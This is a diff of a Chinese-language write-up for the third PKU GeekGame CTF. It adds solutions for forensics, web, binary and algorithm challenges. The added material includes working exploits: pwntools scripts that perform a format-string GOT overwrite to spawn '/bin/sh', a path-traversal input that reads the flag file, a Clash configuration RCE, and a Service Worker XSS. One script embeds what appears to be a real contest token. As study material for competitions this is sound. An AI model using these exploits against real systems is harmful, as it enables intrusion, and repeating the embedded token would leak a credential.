@@ -4,7 +4,7 @@ head_image: 384e5dd5bf89a59e1944f50dc71a6525.jpg
 head_image_height: 600
 head_image_width: 900
 info: 再来玩玩。
-last_modified_at: 2023-10-21 23:53
+last_modified_at: 2023-10-23 15:56
 license: by-nc
 tags: 题解
 title: 第三届北京大学信息安全综合能力竞赛个人题解
@@ -22,9 +22,12 @@ title: 第三届北京大学信息安全综合能力竞赛个人题解
 
 因为做题的时候写的代码基本上是“能用就行”，有些中间步骤已经删掉了，写题解的时候重新整理了一遍（主要是改了一些比较随便的命名），所以可能有些错误。
 
-按照比赛平台提交时的提示，参考题面和官方题解，本题解授权协议为 [CC-BY-NC 4.0](https://creativecommons.org/licenses/by-nc/4.0/)。
+按照比赛平台提交时的提示，参考题面和官方题解，本题解授权协议为 [CC-BY-NC 4.0](https://creativecommons.org/licenses/by-nc/4.0/)。因为有官方题面存档，所以不再抄题了。解题代码：[GitHub](https://github.com/Xzonn/PKUGeekGame3rdWriteups)。
 
-## 一眼盯帧
+## Tutorial
+### 一眼盯帧
+> [题面和官方题解](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob23-signin)
+
 祖传签到题，下载附件，然后拿PhotoShop打开GIF文件，显示所有帧，然后模式改为“变暗”，再去掉碍事的第一帧，就能得到拼在一起的结果：
 
 {% include figure.html src="4ae891ce7f7359cd023c54ffdfb289bb.png" alt="模式改为“变暗”" width="223.5" height="218" %}
@@ -41,10 +44,12 @@ synt{jrypbzrarjcynlref}
 flag{welcomenewplayers}
 ```
 
-## 小北问答!!!!!
+### 小北问答!!!!!
+> [题面和官方题解](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob18-trivia)
+
 祖传小北问答，这次题目好像比之前简单不少，而且提交限制是一小时一次，多猜几次就能对了。实际上我只猜了3次。
 
-### 1. 在北京大学（校级）高性能计算平台中，什么命令可以提交一个非交互式任务？
+##### 1. 在北京大学（校级）高性能计算平台中，什么命令可以提交一个非交互式任务？
 找到官方[使用教程的说明](https://hpc.pku.edu.cn/_book/guide/slurm/slurm.html)：
 
 > 运行作业的方式有两种：
@@ -55,7 +60,7 @@ flag{welcomenewplayers}
 
 既然说“非交互式任务”，所以应该是第一种，`sbatch`。
 
-### 2. 根据 GPL 许可证的要求，基于 Linux 二次开发的操作系统内核必须开源。例如小米公司开源了 Redmi K60 Ultra 手机的内核。其内核版本号是？
+##### 2. 根据 GPL 许可证的要求，基于 Linux 二次开发的操作系统内核必须开源。例如小米公司开源了 Redmi K60 Ultra 手机的内核。其内核版本号是？
 谷歌搜索“Redmi K60 Ultra Linux kernel”，找到小米官方的[GitHub仓库](https://github.com/MiCode/Xiaomi_Kernel_OpenSource)，最下面一行发现“Redmi K60 Ultra”对应标签“corot-s-oss”。但这个仓库没有“corot-s-oss”分支，只有“corot-t-oss”分支，不知道是不是哪里出了问题，但是从提交信息上来看确实是Redmi K60 Ultra的仓库。
 
 查看`Makefile`文件：
@@ -71,7 +76,7 @@ NAME = Trick or Treat
 
 答案是`5.15.78`。
 
-### 3. 每款苹果产品都有一个内部的识别名称（Identifier），例如初代 iPhone 是 iPhone1,1。那么 Apple Watch Series 8（蜂窝版本，41mm 尺寸）是什么？
+##### 3. 每款苹果产品都有一个内部的识别名称（Identifier），例如初代 iPhone 是 iPhone1,1。那么 Apple Watch Series 8（蜂窝版本，41mm 尺寸）是什么？
 谷歌搜索“iPhone1,1 Identifier”，找到一个[Gist](https://gist.github.com/adamawolf/3048717)：
 
 ``` plaintext
@@ -83,7 +88,7 @@ Watch6,17 : Apple Watch Series 8 45mm case (GPS+Cellular)
 
 按照要求的版本，答案是`Watch6,16`。
 
-### 4. 本届 PKU GeekGame 的比赛平台会禁止选手昵称中包含某些特殊字符。截止到 2023 年 10 月 1 日，共禁止了多少个字符？（提示：本题答案与 Python 版本有关，以平台实际运行情况为准）
+##### 4. 本届 PKU GeekGame 的比赛平台会禁止选手昵称中包含某些特殊字符。截止到 2023 年 10 月 1 日，共禁止了多少个字符？（提示：本题答案与 Python 版本有关，以平台实际运行情况为准）
 比赛平台前后端都是开源的，在[后端的仓库](https://github.com/PKU-GeekGame/gs-backend)找到10月1日的提交版本[`abbbbb7`](https://github.com/PKU-GeekGame/gs-backend/tree/abbbbb7222052fd8d15a5a4b6b802847eeaf95af)，搜索“昵称”，发现几行代码：
 
 ``` python
@@ -184,14 +189,14 @@ jobs:
 
 这个只能试出来，答案是`4445`。
 
-### 5. 在 2011 年 1 月，Bilibili 游戏区下共有哪些子分区？（按网站显示顺序，以半角逗号分隔）
+##### 5. 在 2011 年 1 月，Bilibili 游戏区下共有哪些子分区？（按网站显示顺序，以半角逗号分隔）
 首先先得查出来bilibili在2011年1月使用的域名是“bilibili.us”（[维基百科](https://zh.wikipedia.org/wiki/Bilibili#%E7%BD%91%E7%AB%99%E6%94%B9%E7%89%88)），然后从进入Wayback Machine的存档网址：<https://web.archive.org/web/201101/http://bilibili.us>，找到2011年1月的存档，发现游戏区下面有这些子分区：
 
 {% include figure.html src="5763fb665eef5ac6c200e278e5be327a.png" alt="存档页面" width="859.5" height="200" %}
 
 答案是`游戏视频,游戏攻略·解说,Mugen,flash游戏`。
 
-### 6. 这个照片中出现了一个大型建筑物，它的官方网站的域名是什么？（照片中部分信息已被有意遮挡，请注意检查答案格式）
+##### 6. 这个照片中出现了一个大型建筑物，它的官方网站的域名是什么？（照片中部分信息已被有意遮挡，请注意检查答案格式）
 （[照片链接](https://prob18.geekgame.pku.edu.cn/static/osint-challenge.jpg)）
 
 先谷歌搜索旗子上的字“启迪控股 清华科技园 中关村 KONZA KACST”，发现[一篇文章](http://www.iaspbo.com.cn/contents/2/533)：
@@ -204,8 +209,11 @@ jobs:
 
 和题目上的图十分类似。根据说明，这里是[卢森堡音乐厅](https://www.philharmonie.lu/)，参考答案格式的正则表达式，正确答案是`philharmonie.lu`。
 
-## Z 公司的服务器
-### Flag 1：服务器
+## Misc
+### Z 公司的服务器
+> [题面和官方题解](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob05-zserver)
+
+#### Flag 1：服务器
 下载下来的题目附件是个`.pcapng`文件，之前没用过，但是谷歌一下就能轻松找到一个打开工具[Wireshark](https://www.wireshark.org/)，免费使用。打开一看，里面是客户端和服务端的交互：
 
 {% include figure.html src="0f8d301bd60031cde1294718e91114bd.png" alt="Wireshark截图" width="1281" height="765" %}
@@ -235,7 +243,7 @@ with open("flag1.bin", "wb") as writer:
 
 执行完之后从`flag1.bin`里面可以找到flag。
 
-### Flag 2：流量包
+#### Flag 2：流量包
 这题确实是看了提示才做出来的，而且是我在比赛最后的两个小时、在乌鲁木齐出差的前提下做出来的。
 
 根据流量包可以找到几条比较长的数据，猜测这个就是需要分析的数据。把这些数据手动拷贝出来粘贴到HxD里，存成`0001.bin`到`0008.bin`。在`0001.bin`的较前面的部分可以看到`JFIF`几个字母，直接猜测是`.jpg`文件的[文件头](https://en.wikipedia.org/wiki/List_of_file_signatures)（从前一条流量也能看到文件名为`flag.jpg`），所以要想办法拼出来个jpg文件。但是，如果直接把8个二进制文件拼起来，并且去掉jpg文件头前面的部分是显示不出来任何东西的。
@@ -331,7 +339,9 @@ while i < len(data):
 
 每解码`0x405`个字节就删掉最后5个字节，最后输出的图片总算是正常了，只不过与原始文件好像还有最后几个字节是对不上的，但是管不了这么多了，`.jpg`文件错了最后几个字节也不影响阅读，反正只要能读出来flag就行。拿这个程序再跑一遍题目的数据就能拿到`flag.jpg`读出flag。
 
-## 猫咪状态监视器
+### 猫咪状态监视器
+> [题面和官方题解](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob15-service)
+
 这题一开始没做出来，看了第二阶段提示才明白的。
 
 根据提示和Dockerfile，自己在本地搭建一个Docker，把`/usr/sbin/service`文件复制出来，分析逻辑，里面检测了是否有`/run/systemd/system`或`/run/openrc/started`，进到Docker里面一找，两个都没有。于是事情就变得简单了，核心代码如下：
@@ -350,7 +360,9 @@ run_via_sysvinit() {
 
 其中`SERVICEDIR`是`/etc/init.d`，`SERVICE`是我的输入，所以这里只需要把`/usr/bin/cat`搞出来就好了。连上终端，输入`STATUS`、`../../usr/bin/cat /flag.txt`，直接把flag输出来了。
 
-## 基本功
+### 基本功
+> [题面和官方题解](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob24-password)
+
 两个flag都是zip密码爆破（好像更严谨来说叫“zip明文攻击”），用到的代码是[bkcrack](https://github.com/kimci86/bkcrack)。能解密的条件说简单也简单，说苛刻也有点苛刻：
 
 - 压缩方法需要是`Store`，加密算法需要是`ZipCrypto`。
@@ -368,10 +380,12 @@ curl -I https://chromedriver.storage.googleapis.com/98.0.4758.48/chromedriver_li
 
 然后直接解密即可，bkcrack得到的是一个密钥，这个密钥并非压缩包的密码，但是能喂给这个程序让它解密其他文件。解压出来`flag1.txt`。
 
-第二个文件包含了一个`.pcapng`文件，刚巧我参考的[一篇文章](https://www.freebuf.com/articles/database/292628.html)讲的就是这个文件格式，头文件格式是固定的，`0x00-0x04`位置是`0a 0d 0d 0a`，`0x06-0x18`位置是`00 00 4d 3c 2b 1a 10 00 00 00 ff ff ff ff ff ff ff ff`，喂给bkcrack，得到密钥，解密出来`flag2.txt`。
+第二个文件包含了一个`.pcapng`文件，刚巧我参考的[一篇文章](https://www.freebuf.com/articles/database/292628.html)讲的就是这个文件格式，头文件格式是固定的，`0x00-0x04`位置是`0a 0d 0d 0a`，`0x06-0x18`位置是`00 00 4d 3c 2b 1a 10 00 00 00 ff ff ff ff ff ff ff ff`，喂给bkcrack，得到密钥，解密出来`flag2.pcapng`。
 
-## Dark Room
-### Flag 1
+### Dark Room
+> [题面和官方题解](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob16-darkroom)
+
+#### Flag 1
 这个题就是我说的那个“稍微有点亏”的题，方法都已经找到了，只是运气不太好。
 
 说明里面提到题目基于[Dark_Room](https://github.com/tinichu316/Dark_Room)，下载下来源代码就能看到地图，当然自己手动画一个地图也很方便。
@@ -430,7 +444,7 @@ def play(file_name):
   writer = open(file_name, "w", -1, "utf8")
   conn = remote("prob16.geekgame.pku.edu.cn", 10016)
   conn.recvuntil(b"Please input your token: ")
-  conn.send(b"MY TOKEN\n")
+  conn.sendline(b"MY TOKEN")
   time.sleep(1)
   conn.recvuntil(b"]: ", timeout=5)
   conn.send(b"newgame\n")
@@ -468,14 +482,120 @@ while True:
 
 存成文件是怕我手一抖把终端关了全白忙活。最终在757.txt中我得到了key，此时的时间是`2023-10-18 18:19`，就差20分钟，65%的分数没了。
 
-## 麦恩·库拉夫特
-### Flag 1：探索的时光
+#### Flag 2
+Flag 2所在的房间在最终房间的下面，通过输入空字符串能把一部分代码泄露出来：
+
+``` text
+invalid literal for int() with base 10: ''
+Traceback (most recent call last):
+    File "dark_room/player.py", line 249, in <module>
+    248:   while flag_number:
+    249:      choice = int(self.recv(b"Guess my public key (give me a number): ").decode())
+                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    250:      if flag_number & 1:
+    251:          p = getStrongPrime(2048)
+    252:          q = getStrongPrime(2048)
+    253:      flag_number >>= 1
+ValueError: invalid literal for int() with base 10: ''
+```
+
+然后就不知道怎么做了，看程序大概是生成了一个大质数，总不会是要爆破这个大质数吧？
+
+----
+
+（赛后交流补记）
+
+“泄露出来的源代码”其实更重要的信息是“调用了`getStrongPrime`这个函数”，我在手动输入的时候也发现了有时候程序返回信息会比较慢，我还以为是网络原因，经过提醒之后才知道，这个程序从低到高依次比较了`flag_number`的每一位（bit），如果是1就调用`getStrongPrime`，如果是0就不调用，这样就可以通过比较程序返回信息的时间来判断`flag_number`的每一位是0还是1，从而得到`flag_number`的值。
+
+{% include figure.html src="4263edde05485b078af40d3e5a5c92ce.png" alt="Copilot，你怎么不早告诉我" width="499.5" height="42.5" %}
+
+拿flag 1的程序改一下：
+
+``` python
+from pwn import *
+
+COMMANDS = [
+  "n",
+  "n",
+  "w",
+  "w",
+  "s",
+  "s",
+  "getflag",
+]
+
+def play():
+  writer = open("output/flag2.txt", "w", -1, "utf8")
+  conn = remote("prob16.geekgame.pku.edu.cn", 10016)
+  conn.recvuntil(b"Please input your token: ")
+  conn.send(b"448:MEYCIQCWia84qwxiWuYqqtctrw6YAzAGcevIrzAikp7FGKm9LwIhAIS_ydCHSUczXU9RK5Cn8fH8acfvPtuj7nrOWU6UtPJW\n")
+  time.sleep(1)
+  conn.recvuntil(b"]: ", timeout=5)
+  conn.send(b"newgame\n")
+  conn.recvuntil(b"]: ", timeout=5)
+  conn.send(b"gamer\n")
+  conn.recvuntil(b"(y/n) ", timeout=5)
+  conn.send(b"y\n")
+  for command in COMMANDS:
+    conn.recvuntil(b"]: ", timeout=5)
+    conn.send(command.encode("utf8") + b"\n")
+
+  start_time = time.time()
+  first = True
+  while True:
+    conn.recvline()
+    line = conn.recvline().decode("utf8").strip()
+    now = time.time()
+    if now - start_time > 0.95:
+      writer.write("1")
+      writer.flush()
+    else:
+      if not first:
+        writer.write("0")
+        writer.flush()
+      else:
+        first = False
+    if line == "Challenge Failed":
+      break
+    start_time = time.time()
+    conn.sendline(b"0")
+  writer.close()
+
+play()
+```
+
+拿到每一位的信息之后反转字符串，然后转换成16进制，发现是flag 2的字节序列，导入HxD即可读出。
+
+顺带一提，上面之所以打引号是因为出题人赛后说这个报错信息是故意的，不是真的泄露源代码。实际上并没有生成大质数，而是直接`sleep(1)`。
+
+### 麦恩·库拉夫特
+> [题面和官方题解](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob22-minecraft)
+
+#### Flag 1：探索的时光
 没怎么玩过Minecraft，现下了一个启动器，刚好我有XGP，可以直接玩官方版。找了半天，最后在一个岔路上找到了flag。
 
-### Flag 2：结束了？
+#### Flag 2：结束了？
 实在是在游戏里找不到第2个flag了，于是搜了一个存档编辑器[NBTExplorer](https://github.com/jaquadro/NBTExplorer)，虽然有点老，但是竟然还能用。打开之后搜索`flag{`可以找到第一个flag，然后发现告示牌有一个id是`minecraft:sign`，接着拿这个id找，能找到第2个flag。
 
-## Emoji Wordle
+#### Flag 3：为什么会变成这样呢？
+用NBTExplorer能找到Flag 3所在的红石电路区域，通过替换材质包的方法可以显示出红石电路的信号强度，搭配OBS录屏，按照5 fps的帧率截图并识别信号强度，可以读出来一段字节序列：
+
+```
+10B55874DB222471B5BE9775109E779ABE03227745767B210DF0BA7109DEB09864542136010213107A2752FD54AE102F239AE8ABD2A17E79FE10DF1584442D810183510E3AB5104F57FB100A41190B506FB4EE6E4B3B1E55987866B810BDA0EE60F86D8DD84910B410BB1071B800887E7600A4BEE1F3092531555B1001AB91010806115024F0EAD16B1F21050F1034AED2F239AED2BEAA1438E6810ADDE2AF67DB4298E810D6437D608388AE726DE170B33BDA4888B25E10BEE9E179BBE7B105D7B3863E302EFE10419279AA01090FF81010AAF4D7AD58090A57BFBA924310102F09780101D1054FE3AA58AA82D04AE3AD8557F0E2155F6652E10106510101544BBF517FF5101031E444F2A300E518411AD7789E47661EF210107A5D0017D7010185D6A90D522D3013215BFEE02BE721010F9A01046100F1021AED4105BBEAA73995610F7095F6A7BBB54F1333D021D19D484489155310755A8E7DD10E09A1AE8FE1010358D100551010B61044952B106D509D9848887710E910820E55FDBE355839D5F500118BBBD287E1A57105F2893E20EDAB55AA32D78FB15FB0D90D69E0770077E2F6889B10B4605A41E7DA45D80911022B47877311A510B82B48D51010E91B2F25A30AA9E9299718E851033A025B996AFB6A10A9881710554FE3A58DEEE46A01DFBEA64A48B5AFEA0507F11BD5D10920670771106B998AF12DE229AEF411B341079109B9BB63195102986651FF33D1110DE2ADB534510A87D40108E477B9A6822DA334B2D510F5D3B94AA10B951089EEA3110110B1B10103F5504570EED10A00D56626EBF108F5AAEE5B13309972101750B66009AFAF9755337E35BB51D5400E6610AAA716D02313F789ADED55B815AB8F4D3B9AA96B7B9F6B2BFF2B41B10D1010E1619E5466BABF44F8FF8D911BAE9535510EBE5B3310F668855D104A361010727B518872D6FFFAE1EE311AD8FE3101011EAB6640D9701085755188FD29A3A106105DDD3F52220EB10DD362210F10421077D2897E8F550B977E1A57D5F23677668143BBB13A3922EB065F1142D471E221E1010E910559E1913FEFAEEF77115BDD2A7A121F72D3AA8B71A557AE66D1E52689D81108B59E1010ABDE0438103B8589447A8A02FFFEFA27195E1AA5710D52E32AF42EB28E86748FAB15ABB10AA2583106265FBA2510510D4A10E1AA06EB5A78B644B94F6610D374778BA2F9716AAEBF779718975103D10105B8F1154F6FBE6386D22D7B5AB01D3183E58B33B79BAF22233A010310B4F8466B21109799D10B74D166E88D5228F4D33B9AA963A57191010FDF3B5A5D9AB0AE6A111B5E5B66746E8944F915598F7246FF7074861799488300A5FF5D5881ABDB61055810E6BD00101D27ED21F110A3EB1F80FBB62AF7795D6AF8DD38131775BF56992864764A10A00BF4C776416A5CFBEEF38EBFAE3700468BEFD0E7357C171B93758BBEFF6B55218CD87FAE158D4DD7616ABBF5626DDDE7F7F0049B4950A8BB1A2C000000004945444A4426080000000000000DA3330E411F55102310410A84EB3AAAE90103A084928585109274E85591777288DBBA573D5739BE11F101DB310F10729E03D106D584537AB488A104E1B18DFE79A6115F3E57BB83ABB18B38617B447A409F9E92B4D42134104E809AAEDF51024F3E6AB437756F289AA10FD9075EAE07BF101E7EE30E809AED2A38DF03ED7297657B810E613410BD13B30A6E7242D77F96B10AA9D915503D576DE1023BA10FB5D0E88BEB60B477D9E14E677ED912359910E22B51010FE517DD3AD66D224F451FEDE0177E1010B5816E856BA13710A1E6224B48BE7DDDBA6B3332EA76884BFA29FA0643583E101055B797DDA2F714FB5786739999FF08DD7130157993D
+```
+
+但是直接把这个字节序列扔到HxD里看着像是乱码，因为不知道起始数据在哪里，也看不出来循环体，所以没法分析是什么二进制文件，于是作罢。
+
+----
+
+（赛后交流补记）
+
+思路应该是对的，只不过我忘了信息里给出来了“数据大小2KB”这个信息，计算了一下按照2048个字节、2.5字节/秒的速度，需要大概14分钟才能接收到所有信息，而我使用笔记本录屏的时候总是会出现莫名其妙的错误，导致实际上并没有读出来一整个循环节就结束了。之后回去应该拿台式机试一试。
+
+## Web
+### Emoji Wordle
+> [题面和官方题解](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob14-emoji)
+
 ### Flag 1：Level 1
 题目提示说Level 1 的答案是固定的，这就简单了，直接拿所有Emoji往上怼，看哪些Emoji在给出的序列里（绿或黄），然后把得到的Emoji用最简单粗暴的方法复制64遍往上怼，得到每个位置的正确Emoji。代码放在下面。输入进去得到flag 1。
 
@@ -575,8 +695,10 @@ print(response.text)
 
 其中`emoji_list.txt`是所有的Emoji，来自[Unicode官方](https://unicode.org/emoji/charts/full-emoji-list.html)。另外flag 3似乎有1分钟内解决的限制。
 
-## 第三新XSS
-### Flag 1：巡猎
+### 第三新XSS
+> [题面和官方题解](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob01-homepage)
+
+#### Flag 1：巡猎
 XSS我听说过，XSS Bot还是第一次见。看了一下解释，应该是说XSS Bot是一个模拟的受害者。
 
 看了下源代码，对于flag 1，这个XSS Bot先访问`/admin/`并放置Cookie，然后再访问我提供的网页，最后输出网页的标题。而这个Cookie有路径控制，没法直接读取。不过路径控制很好解决，拿iframe就能绕开。代码：
@@ -587,7 +709,7 @@ XSS我听说过，XSS Bot还是第一次见。看了一下解释，应该是说X
 
 另外要注意题目区分flag 1和flag 2是靠协议，只有http协议才会给出flag 1。
 
-### Flag 2：记忆
+#### Flag 2：记忆
 和flag 1相反，flag 2需要先访问我提供的网页，再访问`/admin/`并放置Cookie。
 
 这个问题我一开始真没想到解决方法，看了提示才知道是[Service Worker](https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers)，这个技术我知道有，但是一直没用过，没想到还能用在这里。根据文档和其他的一些教程，我需要注册一个Service Worker，接管`/admin/`页面的源代码。
@@ -656,10 +778,23 @@ Header：
 {"Content-Type": "text/javascript", "Service-Worker-Allowed": "/"}
 ```
 
-这样就能获得Flag2。
+这样就能获得flag 2。
 
-## 非法所得
-### Flag 2
+### 简单的打字稿
+> [题面和官方题解](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob13-easyts)
+
+TypeScript的类型只在编译的时候检查，所以只能想办法搞坏编译器，但是不知道怎样才能让“flag”的内容输出而不输出“flag”这几个字。
+
+----
+
+（赛后交流补记）
+
+原来[“TypeScript类型体操”](https://github.com/type-challenges/type-challenges/blob/main/README.zh-CN.md)是真实存在的？？？已经开始看不懂了，应该报个班培训一下TypeScript再做题的。
+
+### 非法所得
+> [题面和官方题解](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob02-greatwall)
+
+#### Flag 2
 紧跟时事。
 
 题目给出的是一个Clash for Windows的客户端，但是没有提供完全的操纵权限，只能查看General、Proxies、Profies，以及导入配置文件。此外就是一个浏览器，会使用这个Clash来访问网站。
@@ -715,7 +850,13 @@ rules:
 
 把这个配置文件发布到公网上（我自己有服务器所以比较简单，没有服务器的话可以试试GitHub Pages），然后导入进去即可获得flag 2。
 
-### Flag 1&Flag 3
+----
+
+（赛后交流补记）
+
+原来Clash配置文件里有个`hosts`参数可以直接劫持域名，这样就不用配置Tinyproxy了。
+
+#### Flag 1&Flag 3
 这两个flag其实我是一块拿到的，提示里面给的[RESTful API](https://clash.gitbook.io/doc/restful-api)我没有用到。
 
 猜测这两个flag需要利用一些漏洞，于是谷歌“Clash 漏洞”真的发现了漏洞，这个漏洞在Clash for Windows的0.19.9版本修复，正好题目提供的是0.19.8版本，于是当然想到就是利用这个漏洞。具体漏洞是一个远程代码执行漏洞（[Issue](https://github.com/Fndroid/clash_for_windows_pkg/issues/2710)），在配置文件中加入特定代码可以执行任意代码，漏洞汇报时给出的案例是调用Windows的计算器。用类似的想法，构建一个新的配置文件，读取flag1所在的`/app/profiles/flag.yml`：
@@ -743,11 +884,14 @@ proxy-groups:
 
 利用同样的办法，把执行的代码由`/usr/bin/cat /app/profiles/flag.yml`改成`/app/readflag`可以拿到flag 3。但是这里我其实有点不太明白的是，flag 3设置了权限`500`，而代码执行是用node用户跑的，应该读不到flag 3才对，不过既然拿到了我也没再仔细研究。
 
-## 汉化绿色版免费下载
-### Flag 1：普通下载
+## Binary
+### 汉化绿色版免费下载
+> [题面和官方题解](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob25-krkr)
+
+#### Flag 1：普通下载
 下载下来解压，看到`.xp3`，是Galgame常见的打包类型，找到一个解包工具[GARbro](https://github.com/morkt/GARbro)，解包即可找到flag 1。
 
-### Flag 2：高速下载
+#### Flag 2：高速下载
 根据上一步解包可以拿到源代码：
 
 ``` plaintext
@@ -883,8 +1027,10 @@ if __name__ == "__main__":
 
 最后在第5888571行找到了答案。
 
-## 初学 C 语言
-### Flag 1
+### 初学 C 语言
+> [题面和官方题解](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob09-easyc)
+
+#### Flag 1
 这题我是在写题解的时候才做出来的，看来写题解确实有助于整理思路。题目给了源代码，但我一直没搞懂靠这些东西怎么能把flag 1给输出出来，根据提示查了[资料](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/)才知道，原来`printf`这个函数还有别的用途，真是开了眼了。
 
 根据资料的说明，`printf`函数会读取第一个参数作为格式化字符串，其他参数都是可选项，如果没有指定的话就从栈里面读取数据。源代码里面的`printf`函数有这么几个参数：
@@ -962,7 +1108,7 @@ from pwn import *
 
 conn = connect("prob09.geekgame.pku.edu.cn", "10009")
 conn.recvuntil(b"Please input your token: ")
-conn.send(b"MY TOKEN\n")
+conn.sendline(b"MY TOKEN")
 conn.recvuntil(b"Please input your instruction:\n")
 conn.sendline(b"%1$p")
 line = conn.recvline().decode("utf8", "ignore")
@@ -982,7 +1128,7 @@ import struct
 
 conn = connect("prob09.geekgame.pku.edu.cn", "10009")
 conn.recvuntil(b"Please input your token: ")
-conn.send(b"MY TOKEN\n")
+conn.sendline(b"MY TOKEN")
 conn.recvuntil(b"Please input your instruction:\n")
 conn.sendline(b"%26$p %27$p %28$p %29$p %30$p %31$p %32$p %33$p")
 line = conn.recvline().decode("utf8", "ignore").strip("\n")
@@ -991,7 +1137,113 @@ print(line_bytes.decode("utf8", "ignore"))
 conn.close()
 ```
 
-## 关键词过滤喵，谢谢喵
+#### Flag 2
+这个题和下面的Baby Stack-Flag 2好像都是利用printf的格式化字符串漏洞，但是这个题的程序似乎有保护，所以没能想出来。
+
+### Baby Stack
+> [题面和官方题解](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob10-babystack)
+
+#### Flag 1
+int溢出很容易猜到，第一步输入0即可，程序里也给了后门，想到是把函数返回地址替换成后门所在的地址。但是栈溢出不知道如何才能利用，buffer的位置似乎是在函数返回地址的下面，也没法用格式化字符串漏洞泄露实际运行的地址。
+
+#### Flag 2
+这个题似乎就是教程上写的题目类型，因为最后用到的函数是`puts`，所以想到把`puts`替换为`system`，第一步泄露真实地址，第二步替换got表的跳转地址，写了个程序：
+
+``` python
+from pwn import *
+
+context(arch="amd64", os="linux")
+
+r = connect("prob11.geekgame.pku.edu.cn", "10011")
+r.recvuntil(b"Please input your token: ")
+r.sendline(b"MY TOKEN")
+
+elf = ELF("./challenge2")
+libc = ELF("./libc.so.6")
+
+offset = 14
+puts_got = elf.got["puts"]
+log.success("puts_got    => {}".format(hex(puts_got)))
+
+r.recvuntil(b"please enter your flag~(less than 0x20 characters)\n")
+payload = f"%{offset + 1}$s".encode("utf-8").ljust(8, b"a") + p64(puts_got)
+r.sendline(payload)
+
+printf_addr = r.recvline()[len(b"this is your flag: "):]
+printf_addr = struct.unpack("<Q", printf_addr[:printf_addr.index(b"a")].ljust(8, b"\x00"))[0]
+log.success("puts_addr   => {}".format(hex(printf_addr)))
+
+system_addr = printf_addr - (libc.symbols["puts"] - libc.symbols["system"])
+log.success("system_addr => {}".format(hex(system_addr)))
+
+btw = sorted(((system_addr & 0xff, 0), ((system_addr >> 8) & 0xff, 1), ((system_addr >> 16) & 0xff, 2)))
+payload = f"%{btw[0][0]}c%{offset + 5}$hhn%{btw[1][0] - btw[0][0]}c%{offset + 6}$hhn%{btw[2][0] - btw[1][0]}c%{offset + 7}$hhn".encode().ljust(40, b"a") + p64(puts_got + btw[0][1]) + p64(puts_got + btw[1][1]) + p64(puts_got + btw[2][1])
+print(payload)
+
+r.recvuntil(b"What will you do to capture it?:")
+r.sendline(payload)
+
+r.recvuntil(b" and your flag again? :")
+payload = b"/bin/sh"
+r.sendline(payload)
+
+r.interactive()
+```
+
+但是实际运行的时候会在换got表的跳转地址时报错，检查了一下程序是可以对got表进行写入的，不知道是哪里出了问题。
+
+----
+
+（赛后交流补记）
+
+看了官方题解，思路基本一样，只不过绝对地址定位用了got表里面的`__libc_start_main`而非`puts`，这点我有些不太理解。其他地方写的都没错。修改一下：
+
+``` python
+from pwn import *
+
+context(arch="amd64", os="linux")
+
+r = connect("prob11.geekgame.pku.edu.cn", "10011")
+r.recvuntil(b"Please input your token: ")
+r.sendline(b"MY TOKEN")
+
+elf = ELF("./challenge2")
+libc = ELF("./libc.so.6")
+
+offset_1 = 14
+offset_2 = 6
+puts_got = elf.got["puts"]
+start_main_got = elf.got["__libc_start_main"]
+
+r.recvuntil(b"please enter your flag~(less than 0x20 characters)\n")
+payload = f"%{offset_1 + 1}$s".encode("utf-8").ljust(8, b"a") + p64(start_main_got)
+r.sendline(payload)
+
+puts_addr = r.recvline()[len(b"this is your flag: "):]
+puts_addr = struct.unpack("<Q", puts_addr[:puts_addr.index(b"a")].ljust(8, b"\x00"))[0]
+log.success("puts_addr   => {}".format(hex(puts_addr)))
+
+system_addr = puts_addr - (libc.symbols["__libc_start_main"] - libc.symbols["system"])
+log.success("system_addr => {}".format(hex(system_addr)))
+
+btw = sorted(((system_addr & 0xff, 0), ((system_addr >> 8) & 0xff, 1), ((system_addr >> 16) & 0xff, 2)))
+payload = f"%{btw[0][0]}c%{offset_2 + 5}$hhn%{btw[1][0] - btw[0][0]}c%{offset_2 + 6}$hhn%{btw[2][0] - btw[1][0]}c%{offset_2 + 7}$hhn".encode().ljust(40, b"a") + p64(puts_got + btw[0][1]) + p64(puts_got + btw[1][1]) + p64(puts_got + btw[2][1])
+print(payload)
+
+r.recvuntil(b"What will you do to capture it?:")
+r.sendline(payload)
+
+r.recvuntil(b" and your flag again? :")
+payload = b"/bin/sh"
+r.sendline(payload)
+
+r.interactive()
+```
+
+## Algorithm
+### 关键词过滤喵，谢谢喵
+> [题面和官方题解](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob04-filtered)
+
 ### Flag 1：字数统计喵
 二进制题和算法题我都有点不太会做，所以就直接跳到这题了喵。题目要求处理后输出10进制的字符串长度，我想了很久之后得出了这么一个思路喵：
 
@@ -1051,12 +1303,126 @@ A：
 谢谢喵
 ```
 
-## 小章鱼的曲奇
-### Flag 1：Smol Cookie
-都知道编程语言的随机数实际上是伪随机数，如果拿到Python的random库生成的连续624个32位整数，就可以用[Python-random-module-cracker](https://github.com/tna0y/Python-random-module-cracker)预测后面的随机数序列。正好源代码里给出来的空白字节是2500个，相当于625个32位整数，那么就可以运行一次程序，拿输出结果前624个32位整数预测最后一个确保准确性，然后再预测出后面的随机数序列，与输出结果异或，得到flag 1。
+### 小章鱼的曲奇
+> [题面和官方题解](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob08-cookie)
 
